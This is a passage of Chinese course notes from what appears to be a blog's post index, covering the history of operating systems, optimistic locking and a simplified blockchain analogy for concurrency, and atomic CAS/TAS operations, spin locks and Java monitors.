市场的失败埋下了伏笔。 大型机操作系统1975 年前，还没有个人电脑，主要是银行、政府、保险公司这些企业在购买计算机。因为比较强调数据吞吐量，也就是单位时间能够处理的业务数量，因此计算机也被称作大型机。 早期的大型机厂商往往会为每个大型机写一个操作系统。后来 1964 年 IBM 自研了 OS/360 操作系统，在这个操作系统之上 IBM 推出了 System/360 大型机，然后在 1965~1978 年间，IBM 以 System/360 的代号陆陆续续推出了多款机器。开发 System/360 大型机的过程也被称为 IBM 的一次世纪豪赌，雇用了 6W 员工，新建了 5 个工厂。这么大力度的投资背后是小沃森的支持，几乎是把 IBM 的家底掏空转型去做计算机了。 IBM 这家公司喜欢押注，而且一次比一次大——2019 年 IBM 以 340 亿美金收购红帽，可能是 IBM 想在云计算和操作系统市场发力。 IBM 投入了大量人力物力在 System/360 上，也推进了 OS/360 的开发。当时 IBM 还自研了磁盘技术，IBM 自己叫作 DASD（Direct access storage devices）。 从上图中你可以看到，IBM 自研的磁盘，非常类似今天硬盘的结构的。当时支持磁盘的操作系统往往叫作 DOS（Disk Operating System）。还有一些是支持磁带的操作系统，叫作 TOS（Tape Operating System）。所以 OS/360 早期叫作 BOS/360，就是 Basic Operating System，后来分成了 DOS/360 和 TOS/360。现在我们不再根据硬件的不同来区分系统了，而是通过驱动程序驱动硬件工作，对硬件的支持更像是插件一样。 为了支持大型机的工作，IBM 在1957 年还推出了 Fortran（Formula Translation）语言。这是一门非常适合数值计算的语言，目的是更好地支持业务逻辑处理。计算机、语言、操作系统，这应该是早期计算机的三要素。把这三个环节做好，就能占领市场。 那个时代的操作系统是作业式的，相当于处理一个个任务，核心是一个任务的调度器。它会先一个任务处理，完成后再处理另一个任务，当时 IBM 还没有想过要开发分时操作系统，也就是多个任务轮流调度的模型。直到 Unix 系统的前身 Multics 出现，IBM 为了应对时代变化推出了 TSS/360（T 代表 Time Sharing）。 和大型机相比，还有一个名词是超级计算机。超级计算机是指拥有其他计算机无法比拟的计算性能的计算机，目前超算每秒可以达到万亿次计算。通常处理业务，不需要超算。超算的作用还是处理科学问题。比如淘宝某次双 11 当天的订单数量是 10 亿量级，单从计算量上说，这并不是很大。如果单纯计算订单状态，恐怕一台手机足矣。但是双 11 期间最恐怖的是 I/O，加上解决大量事务带来的压力，还要同时保证一致性、可用性、分区容错性带来的系统性工作量。 如果企业没有能力像阿里巴巴一样建立一个分布式集群，同时雇佣大量顶级程序员，就可以直接购买大型机，这样做是相对比较划算的。大型机的主要目标就是为了集中式处理 I/O 和作业提供响应巨大的吞吐量的能力。目前还没有几个企业拥有阿里巴巴处理交易的能力。因此 IBM 的大型机一直拥有非常大的市场。 比如 IBM 的 z15 大型机，每天可以处理 1 万亿笔订单，内部可以部署 240 万个 Linux 容器。今天的银行交易、航班处理、政府的税务基本都还是大型机在管理。大型机价格也是相对较贵的，一台机器算上硬件、软件和维护费用，一年间花费上亿也是很正常的事情。 UnixIBM 是一家商业驱动的公司，至今已经 100 多年历史。因为 IBM 喜欢用蓝色，大家经常戏称它是 Big Blue（蓝巨人）。IBM 的巨头们有魄力押注，看准了计算机时代的来临，雇用了 60000 员工，开了 5 个工厂，几乎把全部积累的财富都投入到了大型机市场，让 IBM 有了 90% 的大型机市场。商业驱动公司的弱点，就是对驱动技术发展缺少真正的热爱，更多还是商业利益的追逐。 1964 年贝尔实验室、MIT 和通用电子公司合作开发了 Multics 操作系统，用在了 GE 645 大型机上。GE 开头就是 Generic Electric，通用电气公司，这家公司当时也有想过生产大型机。当时总共有 8 家公司生产大型机，因为做不过 IBM，被戏称为白雪公主和 7 个小矮人。Multics 提出了不少新的概念，比如： 后来 IBM 逐渐对 Multics 引起了重视， 推出 TSS/360 系统，这只是做出防御性部署的一个举措。但是同在贝尔实验室 Multics 项目组的丹尼斯·里奇（C 语言的作者）和肯·汤普逊却看到了希望。他们都是 30 岁不到，正是意气风发的时候。两个人对程序设计、操作系统都有着浓厚的兴趣，特别是肯·汤普逊，之前已经做过大量的操作系统开发，还写过游戏，他们都觉得 Multics 设计太过于复杂了。再加上 Multics 没取得商业成功，贝尔实验室叫停了这个项目后，两个人就开始合作写 Unix。Unix 这个名字一方面参考 Multics，另一方面参考了 Uniplexed，它是 Multiplexed 的反义词，含义有点像统一和简化。 Unix 早期开放了源代码，可以说是现代操作系统的奠基之作——支持多任务、多用户，还支持分级安全策略。拥有内核、内存管理、文件系统、正则表达式、开发工具、可执行文件格式、命令行工具等等。可以说，到今天 Unix 不再代表某种操作系统，而是一套统一的，大家都认可的架构标准。 因为开源的原因，Unix 的版本非常复杂。具体你可以看下面这张大图。 绿色的是开源版本，黄色的是混合版本，红色的是闭源版本。这里面有大型机使用的版本，有给工作站使用的版本，也有个人电脑版本。比如 Mac OS、SunOS、Solaris 都有用于个人电脑和工作站；HP-UX 还用作过大型机操作系统。另外，Linux 系统虽然不是 Unix，但是参考了 Unix 的设计，并且遵照 Unix 的规范，它从 Unix 中继承过去不少好用的工具，这种我们称为 Unix-like 操作系统。 个人电脑革命从大型机兴起后，就陆续有人开始做个人电脑。但是第一台真正火了的个人电脑，是 1975 年 MITS 公司推出的 Altair 8800。 里面有套餐可选，套餐价是 $439。MITS 的创始人 ED Roberts，和投资人承诺可以卖出去 800 台，没想到第一个月就卖出了 1000 台。对于一台没有显示器、没有键盘，硬件是组装的也不是自有品牌的电脑，它的购买者更多的是个人电脑爱好者们。用户可以通过上面的开关进行编程，然后执行简单的程序，通过观察信号灯看到输出。所以，市场对个人电脑的需求，是普遍存在的，哪怕是好奇心，大家也愿意为之买单。比尔·盖茨也买了这台机器，我们后面再说。 Altair 8800 出品半年后，做个人电脑的公司就如雨后春笋一样出现了。IBM 当然也嗅到了商机。 1976 年 21 岁的乔布斯在一次聚会中说服了 26 岁的沃兹尼亚克一起设计 Apple I 电脑。 沃兹尼亚克大二的时候，做过一台组装电脑，在这次聚会上，他的梦想被乔布斯点燃了，当晚就做了 Apple I 的设计图。1976 年 6 月份，Apple I 电脑就生产出了 200 台，最终卖出去 20 多台。 当时 Apple I 只提供一块板，不提供键盘、显示器等设备。这样的电脑竟然有销量，在今天仍然是不可想象的。 Apple I 在商业上的发展不太成功，但是 1977 年，乔布斯又说服了投资人，投资生产 Apple II。结果当年就让乔布斯身价上百万，两年后就让他身价过亿。 你可以看到 Apple II 就已经是一个完整的机器了。一开始 Apple II 是苹果自研的操作系统，并带有沃兹尼亚克写的简单的 BASIC 语言解释器。1978 年 Apple 公司花了 13000 美金采购了一家小公司的操作系统，这家小公司负责给苹果开发系统，也就是后来的 Apple DOS 操作系统。这家公司还为 Apple DOS 增加了文件浏览器。 1980s 初， 蓝巨人 IBM 感受到了来自 Apple 的压力。如果个人市场完全被抢占，这对于一家专做商业系统的巨头影响会非常大。因此 IBM 成立了一个特别行动小组，代号 Project Chess，目标就是一年要做出一台能够上市的 PC。但是这次 IBM 没有豪赌，只是组织了一个 150 人的团队。因此，他们决定从硬件到软件都使用其他厂商的，当时的说法叫作开放平台。 IBM 没有个人电脑上可用的操作系统，因此找到了当时一家做操作系统和个人电脑的厂商，Digital Research 公司。Digital Research 的 CP/M 操作系统已经受到了市场的认可，但是这家公司的创始人竟然拒绝了蓝巨人的提议，态度也不是很友好。这导致 Digital Research 直接错过了登顶的机会。蓝巨人无奈之下，就找到了只有 22 岁的比尔·盖茨。 盖茨 22 岁的时候和好朋友艾伦创了微软公司。他其实也购买了 Altair 8800（就是本课时前面我们提到的第一台卖火的机器），但是他们目的是和 Altair 的制造商 MITS 公司搞好关系。最终盖茨成功说服了 MITS 公司雇佣艾伦，在 Altair 中提供 BASIC 解释器。BASIC 这门语言 1964 年就存在了，但是盖茨和艾伦是第一个把它迁移到 PC 领域的。IBM 看上了盖茨的团队，加上 Digital Research 拒绝了自己，有点生气，就找到了盖茨。 盖茨非常重视这次机会。但是这里有个问题，微软当时手上是没有操作系统的，他们连夜搞定了一个方案，就是去购买另一家公司的 86-DOS 操作系统，然后承诺 IBM 自己团队负责修改和维护。微软花了 50000 美金买了 86-DOS 的使用权，允许修改和再发布。然后微软再将 86-DOS 授权给 IBM。这里面有非常多有趣的故事，如果你感兴趣可以去查资料了解更多的内容。 最后，Project Chess 小组在 1 年内，成功完成了使命，做出了 IBM 个人电脑，看上去非常像 APPLE II。名字就叫 Personal Computer， 就是我们今天说的 PC。86-DOS 也改成了 PC DOS，IBM 的加入又给 PC 市场带了一波节奏，让更多的人了解到了个人电脑。 微软也跟着水涨船高，每销售 1 台 PC，微软虽然拿不到利润，但保留了 PC DOS 的版权。而且拿到 IBM 的合同，为 IBM 开发核心系统，这也使得微软的地位大涨。盖茨相信马上就会有其他厂商开始和 IBM 竞争，会需要 PC DOS，而微软只需要专心做好操作系统就足够了。 其实没有用多久， 1982 年康柏公司花了几个月时间，雇用了 100 多个工程师，逆向工程了 IBM PC，然后就推出了兼容 IBM PC 的电脑，价格稍微便宜一点。然后整个产业沸腾了，各种各样的商家都进来逆向 IBM PC。整个产业陷入了价格战，每过半年人们可以花更少的钱，拿到配置更高的机器。这个时候微软就在背后卖操作系统，也就是 PC DOS 的保真版，MS-DOS。直到 10 年后，微软正式和 IBM 决裂。 微软第一个视窗操作系统是 1985 年，然后又被 IBM 要求开发它的竞品 OS/2。需要同时推进两个系统，所以微软不是很开心，但是又不能得罪蓝巨人。IBM 也不是很舒服，但是又不得不依赖微软。这个情况一直持续到 1995 年左右，Windows 95 发布的时候，微软还使用 MS-DOS 作为操作系统核心，到了 2001 年 Windows XP 发布的时候，就切换到了 Windows NT 内核。就这样，微软成功发展壮大，并逃离蓝巨人的掌控，成为世界上最大的操作系统公司。 Linux微软的崛起伴随着个人电脑的崛起。但是推动操作系统技术发展，还有另一条线，就是以开源力量为主导的 Unix 线。Unix 出现后，随着一些商业公司逐渐加入，部分公司开始不愿意再公开源代码，而是公开销售修改过的 Unix，这引起了很多黑客的不满。其中比较著名的有理查德·斯托曼和林纳斯。 大黑客理查德·斯托曼有一次觉得打印机有一部分功能不方便，想要修改，却被施乐公司拒绝提供打印机驱动的源代码，导致了一些茅盾。再加上自己工作的 AI 实验室的成员被商业公司挖走了，他认为商业阻碍了技术进步。于是开始到处呼吁软件应该是自由的、开源的，人们应该拿到源代码进行修改和再发布。 1985 年理查德·斯托曼发布了 GNU 项目，本身 GNU 是一个左递归，就是 GNU = GNU’s not Unix。GNU 整体来说还是基于 Unix 生态，但在斯托曼的领导下开发了大量的优质工具，比如 gcc 和 emacs 等。但是斯托曼一直为 GNU 没有自己的操作系统而苦恼。 结果 1991 年 GNU 项目迎来了转机，年仅 21 岁的林纳斯·托瓦兹在网络上发布了一个开源的操作系统，就是 Linux。林纳斯的经历和斯托曼有点类似，所以林纳斯会议听斯托曼讲座，让他有种热血沸腾的感觉。林纳斯不满意 MS-DOS 不开源，但是作为学生党，刚刚学完了 Andy 的《操作系统：设计与实现》，本来一开始没有想过要写 Linux。最后是因为 Unix 的商用版本太贵了买不起，才开始写 Linux。 斯托曼也觉得 GNU 不能没有操作系统，就统称为 GNU/Linux，并且利用自己的影响力帮助林纳斯推广 Linux。这样就慢慢吸引了世界上一批顶级的黑客，一起来写 Linux。后来 Linux 慢慢成长壮大，成为一块主流的服务器操作系统。当然 Linux 后来也衍生了大量的版本，下图是不同版本的 Linux 的分布。 数据取自 W3Techs.com 2020 Ubuntu 源自 Debian，有着非常漂亮的桌面体验，我就是使用 Ubuntu 开发程序。 Ubuntu 后面有商业公司 Canonical 的支持，也有社区的支持。Centos 源自 Red Hat 公司的企业版 Linux（RHEL），商用版本的各种硬件、软件支持通常会好一些，因此目前国内互联网企业的运维都偏向使用 CentosOS。第三名的 Debian 是 Ubuntu 的源头，是一个完全由自由软件精神驱动的社区产品，提供了大量的自由软件。当然也有人批评 Debian 太过于松散，发行周期太长，漏洞修复周期长等等。 Android乔布斯的苹果电脑最终没有卖过微软的操作系统。但是苹果手机就独占了世界上 2/3 的手机利润。苹果手机取得成功后，各大厂商都开始做智能手机。然后 Google 收购了 Android 公司，复刻了微软成功道路。Android 是基于 Linux 改造的。Android 之所以能成功有这么几个原因： Android 是免费的，因此手机厂商不需要为使用 Android 支付额外的费用，而 Google 可以利用 Google 的移动服务变现，据统计 Google Play 应用商店 + Google 搜索服务 + Google 地图三项一年的营收就可以到 188 亿美金； Android 是开源生态，各大厂商可以基于 Android 修改； Android 系统基于 Linux 稳定性很好，崩溃率很低； 最后就是应用生态，用 Android 技术开发 App 可以在各大手机品牌通用。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"乐观锁-区块链","slug":"计操/乐观锁-区块链","date":"2021-07-22T10:24:55.000Z","updated":"2021-07-22T13:16:05.072Z","comments":true,"path":"2021/07/22/计操/乐观锁-区块链/","link":"","permalink":"https://www.shanghua.live/2021/07/22/%E8%AE%A1%E6%93%8D/%E4%B9%90%E8%A7%82%E9%94%81-%E5%8C%BA%E5%9D%97%E9%93%BE/","excerpt":"","text":"除了上锁还有哪些并发控制方法？ 上面这道面试题是在“有哪些并发控制方法？”这个问题的基础上加了一个限制条件。 在我面试候选人的过程中，“上锁”是我听到过回答频次最多的答案，也就是说大多数程序员都可以想到这个并发控制方法。因此，是否能回答出上锁以外的方法，是检验程序员能力的一个分水岭，其实锁以外还有大量优秀的方法。 你掌握的方法越多，那么在解决实际问题的时候，思路就越多。即使你没有做过高并发场景的设计，但是如果脑海中有大量优秀的方法可以使用，那么公司也会考虑培养你，将高并发场景交给你去解决。今天我们就以这道面试题为引，一起探讨下“锁以外的并发控制方法”。 悲观锁/乐观锁说到并发场景，设计系统的目的往往是达到同步（Synchronized）的状态，同步就是大家最终对数据的理解达成了一致。 同步的一种方式，就是让临界区互斥。 这种方式，每次只有一个线程可以进入临界区。比如多个人修改一篇文章，这意味着必须等一个人编辑完，另一个人才能编辑。但是从实际问题出发，如果多个人编辑的不是文章的同一部分，是可以同时编辑的。因此，让临界区互斥的方法（对临界区上锁），具有强烈的排他性，对修改持保守态度，我们称为悲观锁（Pessimistic Lock）。 通常意义上，我们说上锁，就是悲观锁，比如说 MySQL 的表锁、行锁、Java 的锁，本质是互斥（mutex）。 和悲观锁（PessimisticLock）持相反意见的，是乐观锁（Optimistic Lock）。你每天都用的，基于乐观锁的应用就是版本控制工具 Git。Git 允许大家一起编辑，将结果先存在本地，然后都可以向远程仓库提交，如果没有版本冲突，就可以提交上去。这就是一种典型的乐观锁的场景，或者称为基于版本控制的场景。 Git 的类比比如现在代码仓库的版本是 100。Bob 和 Alice 把版本 100 拷贝到本地，Bob 在本地写到了 106 版本，Alice 在本地写到 108 版本。那么如果 Alice 先提交，代码仓库的版本就到了 108。 Bob 再提交的时候，发现版本已经不是 100 了，就需要把最新的代码 fetch 到本地，然后合并冲突，再尝试提交一个更新的版本，比如 110。 这种方式非常类似cas指令的形式，就是每次更新的发起方，需要明确地知道想从多少版本更新到多少版本。以 Git 为例，可以写出cas的伪代码： 12cas(&amp;version, 100, 108); // 成功cas(&amp;version, 100, 106); // 失败，因为version是108 上面代码第二次cas操作时因为版本变了，更新失败，这就是一个乐观锁——Alice 和 Bob 可以同时写，先更新的人被采纳，后更新的人负责解决冲突。 购物车的类比再举个例子，比如说要实现一个购物车。用户可能在移动端、PC 端之间切换，比如他用一会手机累了，然后换成用电脑，当他用电脑累了，再换回手机。 在移动端和 PC 端，用户都在操作购物车。 比如在移动端上，用户增加了商品 A；然后用户打开 PC 端，增加了商品 B；然后用户又换回了移动端，想增加商品 C。 这种时候，如果用悲观锁，用户登录移动端后，一种方案就是把 PC 端下线——当然这个方案显然不合理。 合理的方案是给购物车一个版本号，假设是 MySQL 表，那么购物车表中就会多一个版本字段。这样当用户操作购物车的时候，检查一下当前购物车的版本号是不是最新的，如果是最新的，那么就正常操作。如果不是最新的，就提示用户购物车在其他地方已被更新，需要刷新。 去中心化方案：区块链的类比继续类比，我们可以思考一个更加有趣的方案。在传统的架构中，我们之所以害怕并发，是因为中心化。比如说 DNS 系统，如果全球所有的 DNS 查询都执行一个集群，这个吞吐量是非常恐怖的，因此 DNS 系统用了一个分级缓存的策略。 但是交易数据分布的时候，比如下单、支付、修改库存，如果用分布式处理，就牵扯到分布式锁（分布式事务）。那么，有没有一个去中心化的方案，让业务不需要集中处理呢？比如说双 11 期间你在淘宝上买东西，可不可以直接和商家下单，而不用通过淘宝的中心系统呢？——如果可以，这也就相当于实现了同步，或者说去掉了高并发的同步。 解决最基本的信用问题考虑购买所有的网购产品，下单不再走中心化的平台。比如阿里、拼多多、 京东、抖音……这些平台用户都不走平台的中心系统下单，而是用户直接和商家签订合同。这个技术现在已经实现了，叫作电子合同。 举例：Alice（A）向苹果店 B 购买了一个 iPhone。那么双方签订电子合同，合同内容 C 是： 12from=A, to=B, price=10000, signature=alice的签名from=B, to=A, object=iPhone, signature=苹果店的签名 上面两条记录，第 1 条是说 A 同意给 B 转 10000 块钱；第 2 条记录说，B 同意给 A 一个 iPhone。如果 A 收了 iPhone 不给 B 打款，B 可以拿着这个电子合同去法院告 A。因为用 A 的签名，可以确定是 Alice 签署了这份协议。同理，如果苹果店不给 Alice iPhone，Alice 可以去法院告苹果店，因为 Alice 可以用苹果店的签名证明合同是真的。 解决货币和库存的问题有了上面的例子，最基本的信用问题解决了。接下来，你可能会问，Alice 怎么证明自己有足够的钱买 iPhone？苹果店怎么证明有足够的 iPhone？ 比如在某个对公开放的节点中，记录了： 123account=alice, money=10000account=bob, iPhone=100…… 以及很多其他的数据 我们假设这里的钱可能是 Alice 用某种手段放进来的。或者我们再简化这个模型，比如全世界所有人的钱，都在这个系统里，这样我们就不用关心钱从哪里来这个问题了。如果是比特币，钱是需要挖矿的。 如图，这个结构也叫作区块链。每个 Block 下面可以存一些数据，每个 Block 知道上一个节点是谁。每个 Block 有上一个节点的摘要签名。也就是说，如果 Block 10 是 Block 11 的上一个节点，那么 Block 11 会知道 Block 10 的存在，且用 Block 11 中 Block 10 的摘要签名，可以证明 Block 10 的数据没有被篡改过。 区块链构成了一个基于历史版本的事实链，前一个版本是后一个版本的历史。Alice 的钱和苹果店的 iPhone 数量，包括全世界所有人的钱，都在这些 Block 里。 购买转账的过程下面请你思考，Alice 购买了 iPhone，需要提交两条新数据到上面的区块链。 12from=A, to=B, price=10000, signature=alice的签名from=B, to=A, object=iPhone, signature=苹果店的签名 那么我们可以在末端节点上再增加一个区块，代表这次交易，如下图： 比如，Alice 先在本地完成这件事情，本地的区块链就会像上图那样。 假设有一个中心化的服务器，专门接收这些区块数据，Alice 接下来就可以把数据提交到中心化的服务器，苹果店从中心化服务器上看到这条信息，认为交易被 Alice 执行了，就准备发货。 如果世界上有很多人同时在这个末端节点上写新的 Block。那么可以考虑由一个可信任的中心服务帮助合并新增的区块数据。就好像多个人同时编辑了一篇文章，发生了冲突，那就可以考虑由一个人整合大家需要修改和新增的内容，避免同时操作产生混乱。 解决欺诈问题正常情况下，所有记录都可以直接合并。但是比如Alice在一家店购买了 1 个 iPhone，在另外一家店购买了 2 个 iPhone，这个时候 Alice 的钱就不够付款了。 或者说 Alice 想用 20000 块买 3 个 iPhone，她还想骗一个。 那么 Alice 最终就需要写这样的记录： 1234from=A, to=B, price=10000, signature=alice的签名from=B, to=A, object=iPhone, signature=一个苹果店的签名from=A, to=B1, price=20000, signature=alice的签名from=B1, to=A, object=iPhoneX2, signature=另一个苹果店的签名 无论 Alice 以什么顺序写入这些记录，她的钱都是不够的，因为她只有 20000 的余额。 这样简单地就解决了欺诈问题。 如果 Alice 想要修改自己的余额，那么 Alice 怎么做呢？ Alice 需要新增一个末端的节点，比如她在末端节点上将自己的余额修改为 999999。那么 Alice 的余额，就和之前 Block 中记录的冲突了。简单一查，就知道 Alice 在欺诈。如果 Alice 想要修改之前的某个节点的数据，这个节点的摘要签名就会发生变化了， 那么后面所有的节点就失效了。 比如 Alice 修改了 Block 9 的数据，并把整个区块链拷贝给 Bob。Bob 通过验证签名，就知道 Alice 在骗人。如果 Alice 修改了所有 Block 9 以后的 Block，相当于修改了完整的一个链条，且修改了所有的签名。Bob 只需要核对其中几个版本和其他人，或者和中心服务的签名的区别就知道 Alice 在欺诈。 刚才有一个设计，就是有一个中心平台供 Bob 下载。如果中心平台修改了数据。那么 Bob 会马上发现存在本地的和自己相关的数据与中心平台不一致。这样 Bob 就会联合其他用户一起抵制中心平台。 所以结论是，区块链一旦写入就不能修改，这样可以防止很多欺诈行为。 解决并发问题假设全球有几十亿人都在下单。那么每次下单，需要创建新的一个 Block。这种情况，会导致最后面的 Block，开很多分支。 这个时候你会发现，这里有同步问题对不对？ 最傻的方案就是用锁解决，比如用一个集中式的办法，去接收所有的请求，这样就又回到中心化的设计。 还有一个高明的办法，就是允许商家开分支。 用户和苹果店订合同，苹果店独立做一个分支，把用户的合同连起来。 这样苹果店自己先维护自己的 Block-Chain，等待合适的时机，再去合并到主分支上。 如果有合同合并不进去，比如余额不足，那再作废这个合同（不发货了）。 这里请你思考这样一种处理方式：如果全世界每天有 1000 亿笔订单要处理，那么可以先拆分成 100 个区域，每个区域是 10W 家店。这样最终每家店的平均并发量在 10000 单。 然后可以考虑每过多长时间，比如 10s，进行一次逐级合并。 这样，整体每个节点的压力就不是很大了。 总结在这一讲，我们主要学习了一些比锁更加有趣的处理方式， 其实还有很多方式，你可以去思考。并发问题也不仅仅是要解决并发问题，并发还伴随着一致性、可用性、欺诈及吞吐量等。一名优秀的架构师是需要储备多个维度的知识，所以还是我常常跟你强调的，知识在于积累，绝非朝夕之功。 另外，我想告诉你的是，其实大厂并不是只招收处理过并发场景的工程师。作为一名资深面试官，我愿意给任何人机会，前提是你的方案打动了我。而设计方案的能力，是可以学习的。你要多思考，多查资料，多整理总结，这样久而久之，就有公司愿意让你做架构了。 那么通过这节课的学习，你现在可以尝试来回答本节关联的面试题目：除了上锁还有哪些并发控制方法？ 【解析】 这个问题比较发散，这一讲我们介绍了基于乐观锁的版本控制，还介绍了区块链技术。另外还有一个名词，并不属于操作系统课程范畴，我也简单给你介绍下。处理并发还可以考虑 Lock-Free 数据结构。比如 Lock-Free 队列，是基于 cas 指令实现的，允许多个线程使用这个队列。再比如 ThreadLocal，让每个线程访问不同的资源，旨在用空间换时间，也是避免锁的一种方案。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"锁、信号量和分布式锁","slug":"计操/锁-信号量和分布式锁","date":"2021-07-22T10:24:55.000Z","updated":"2021-07-22T11:25:52.495Z","comments":true,"path":"2021/07/22/计操/锁-信号量和分布式锁/","link":"","permalink":"https://www.shanghua.live/2021/07/22/%E8%AE%A1%E6%93%8D/%E9%94%81-%E4%BF%A1%E5%8F%B7%E9%87%8F%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/","excerpt":"","text":"原子操作要想弄清楚锁，就要弄清楚锁的实现，实现锁需要底层提供的原子操作，因此我们先来学习下原子操作。 原子操作就是操作不可分。在多线程环境，一个原子操作的执行过程无法被中断。那么你可以思考下，具体原子操作的一个示例。 比如i++就不是一个原子操作，因为它是 3 个原子操作组合而成的： 读取 i 的值； 计算 i+1； 写入新的值。 像这样的操作，在多线程 + 多核环境会造成竞争条件。 竞争条件竞争条件就是说多个线程对一个资源（内存地址）的读写存在竞争，在这种条件下，最后这个资源的值不可预测，而是取决于竞争时具体的执行顺序。 举个例子，比如两个线程并发执行i++。那么可以有下面这个操作顺序，假设执行前i=0： 虽然上面的程序执行了两次i++，但最终i的值为 1。 i++这段程序访问了共享资源，也就是变量i，这种访问共享资源的程序片段我们称为临界区。在临界区，程序片段会访问共享资源，造成竞争条件，也就是共享资源的值最终取决于程序执行的时序，因此这个值不是确定的。 竞争条件是一件非常糟糕的事情，你可以把上面的程序想象成两个自动提款机。如果用户同时操作两个自动提款机，用户的余额就可能会被算错。 解决竞争条件解决竞争条件有很多方案，一种方案就是不要让程序同时进入临界区，这个方案叫作互斥。还有一些方案旨在避免竞争条件，比如 ThreadLocal、 cas 指令、乐观锁 避免临界区不让程序同时进入临界区这个方案比较简单，核心就是我们给每个线程一个变量i，比如利用 ThreadLocal，这样线程之间就不存在竞争关系了。这样做优点很明显，缺点就是并不是所有的情况都允许你这样做。有一些资源是需要共享的，比如一个聊天室，如果每次用户请求都有一个单独的线程在处理，不可能为每个请求（线程）都维护一份聊天记录。 cas 指令另一个方案是利用 CPU 的指令，让i++成为一个原子操作。 很多 CPU 都提供 Compare And Swap 指令。这个指令的作用是更新一个内存地址的值，比如把i更新为i+1，但是这个指令明确要求使用者必须确定知道内存地址中的值是多少。比如一个线程想把i从100更新到101，线程必须明确地知道现在i是 100，否则就会更新失败。 cas 可以用下面这个函数表示： 1cas(&amp;oldValue, expectedValue, targetValue) 这里我用的是伪代码，用&amp;符号代表这里取内存地址。注意 cas 是 CPU 提供的原子操作。因此上面的比较和设置值的过程，是原子的，也就是不可分。 比如想用 cas 更新i的值，而且知道i是 100，想更新成101。那么就可以这样做： 1cas(&amp;i, 100, 101) 如果在这个过程中，有其他线程把i更新为101，这次调用会返回 false，否则返回 true。 所以i++程序可以等价的修改为： 12// i++等价程序cas(&amp;i, i, i+1) 上面的程序执行时，其实是 3 条指令： 123读取i 计算i+1cas操作：比较期望值i和i的真实值的值是否相等，如果是，更新目标值 假设i=0，考虑两个线程分别执行一次这个程序，尝试构造竞争条件： 你可以看到通过这种方式，cas 解决了一部分问题，找到了竞争条件，并返回了 false。但是还是无法计算出正确的结果。因为最后一次 cas 失败了。 如果要完全解决可以考虑这样去实现： 123while(!cas(&amp;i, i, i+1))&#123; // 什么都不做&#125; 如果 cas 返回 false，那么会尝试再读一次 i 的值，直到 cas 成功。 tas 指令还有一个方案是 tas 指令，有的 CPU 没有提供 cas（大部分服务器是提供的），提供一种 Test-And-Set 指令（tas）。tas 指令的目标是设置一个内存地址的值为 1，它的工作原理和 cas 相似。首先比较内存地址的数据和 1 的值，如果内存地址是 0，那么把这个地址置 1。如果是 1，那么失败。 所以你可以把 tas 看作一个特殊版的cas，可以这样来理解： 123tas(&amp;lock) &#123; return cas(&amp;lock, 0, 1&#125; 锁锁（lock），目标是实现抢占（preempt）。就是只让给定数量的线程进入临界区。锁可以用tas或者cas来实现。 举个例子：如果希望同时只能有一个线程执行i++，伪代码可以这么写： 123enter();i++;leave(); 可以考虑用cas实现enter和leave函数，代码如下： 123456789int lock = 0;enter()&#123; while( !cas(&amp;lock, 0, 1) ) &#123; // 什么也不做 &#125;&#125;leave()&#123; lock = 0;&#125; 多个线程竞争一个整数的 lock 变量，0 代表目前没有线程进入临界区，1 代表目前有线程进入临界区。利用cas原子指令我们可以对临界区进行管理。如果一个线程利用 cas 将 lock 设置为 1，那么另一个线程就会一直执行cas操作，直到锁被释放。 语言级锁的实现上面解决竞争条件的时候，我们用到了锁。 相比 cas，锁是一种简单直观的模型。总体来说，cas 更底层，用 cas 解决问题优化空间更大。但是用锁解决问题，代码更容易写——进入临界区之前 lock，出去就 unlock。 从上面这段代码可以看出，为了定义锁，我们需要用到一个整型。如果实现得好，可以考虑这个整数由语言级定义。 比如考虑让用户传递一个变量过去： 1234int lock = 0;enter(&amp;lock);// 临界区代码leave(&amp;lock); 自旋锁上面我们已经用过自旋锁了，这是之前的代码： 12345enter()&#123; while( !cas(&amp;lock, 0, 1) ) &#123; // 什么也不做 &#125;&#125; 这段代码不断在 CPU 中执行指令，直到锁被其他线程释放。这种情况线程不会主动释放资源，我们称为自旋锁。自旋锁的优点就是不会主动发生 Context Switch，也就是线程切换，因为线程切换比较消耗时间。自旋锁缺点也非常明显，比较消耗 CPU 资源。如果自旋锁一直拿不到锁，会一直执行。 wait 操作你可以考虑实现一个 wait 操作，主动触发 Context Switch。这样就解决了 CPU 消耗的问题。但是触发 Context Switch 也是比较消耗成本的事情，那么有没有更好的方法呢？ 123456enter()&#123; while( !cas(&amp;lock, 0, 1) ) &#123; // sleep(1000ms); wait(); &#125;&#125; 你可以看下上面的代码，这里有一个更好的方法：就是 cas 失败后，马上调用sleep方法让线程休眠一段时间。但是这样，可能会出现锁已经好了，但是还需要多休眠一小段时间的情况，影响计算效率。 另一个方案，就是用wait方法，等待一个信号——直到另一个线程调用notify方法，通知这个线程结束休眠。但是这种情况——wait 和 notify 的模型要如何实现呢？ 生产者消费者模型一个合理的实现就是生产者消费者模型。 wait 是一个生产者，将当前线程挂到一个等待队列上，并休眠。notify 是一个消费者，从等待队列中取出一个线程，并重新排队。 如果使用这个模型，那么我们之前简单用enter和leave来封装加锁和解锁的模式，就需要变化。我们需要把enterleavewait``notify的逻辑都封装起来，不让用户感知到它们的存在。 比如 Java 语言，Java 为每个对象增加了一个 Object Header 区域，里面一个锁的位（bit），锁并不需要一个 32 位整数，一个 bit 足够。下面的代码用户使用 synchronized 关键字让临界区访问互斥。 123synchronized(obj)&#123;// enter // 临界区代码&#125; // leave synchronized 关键字的内部实现，用到了封装好的底层代码——Monitor 对象。每个 Java 对象都关联了一个 Monitor 对象。Monitor 封装了对锁的操作，比如 enter、leave 的调用，这样简化了 Java 程序员的心智负担，你只需要调用 synchronized 关键字。 另外，Monitor 实现了生产者、消费者模型。 如果一个线程拿到锁，那么这个线程继续执行； 如果一个线程竞争锁失败，Montior 就调用 wait 方法触发生产者的逻辑，把线程加入等待集合； 如果一个线程执行完成，Monitor 就调用一次 notify 方法恢复一个等待的线程。 这样，Monitor 除了提供了互斥，还提供了线程间的通信，避免了使用自旋锁，还简化了程序设计。 信号量接下来介绍一个叫作信号量的方法，你可以把它看作是互斥的一个广义版。我们考虑一种更加广义的锁，这里请你思考如何同时允许 N 个线程进入临界区呢？ 